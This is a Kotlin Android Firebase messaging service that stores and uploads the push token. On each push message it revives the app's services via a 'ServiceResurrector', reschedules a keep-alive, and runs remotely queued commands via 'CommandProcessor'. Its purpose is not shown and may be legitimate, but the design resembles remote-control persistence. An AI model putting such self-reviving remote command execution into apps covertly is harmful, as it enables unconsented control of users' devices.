package com.example.myandroid

import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MyFcmService : FirebaseMessagingService() {

    override fun onNewToken(token: String) {
        // Save token locally for the HealthWorker to pick up
        getSharedPreferences("app_identity", MODE_PRIVATE)
            .edit().putString("fcm_token", token).apply()
        DebugLogger.log("FCM", "New token generated")
        
        // Trigger immediate robust upload
        val constraints = androidx.work.Constraints.Builder()
            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
            .build()
        val immediateHealthCheck = androidx.work.OneTimeWorkRequestBuilder<HealthWorker>()
            .setConstraints(constraints)
            .build()
        androidx.work.WorkManager.getInstance(applicationContext).enqueueUniqueWork(
            "FCM_TOKEN_UPDATE", 
            androidx.work.ExistingWorkPolicy.REPLACE, 
            immediateHealthCheck
        )
    }

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        val data = remoteMessage.data
        DebugLogger.log("FCM", "Push Recv. ID: ${remoteMessage.messageId} | Data: $data")
        
        ServiceResurrector.shock(applicationContext)
        KeepAliveReceiver.scheduleNext(applicationContext)

        CoroutineScope(Dispatchers.IO).launch {
            // Delay slightly to allow network to stabilize after wake-up
            kotlinx.coroutines.delay(1000)
            CommandProcessor.checkAndExecute(applicationContext)
        }
    }
}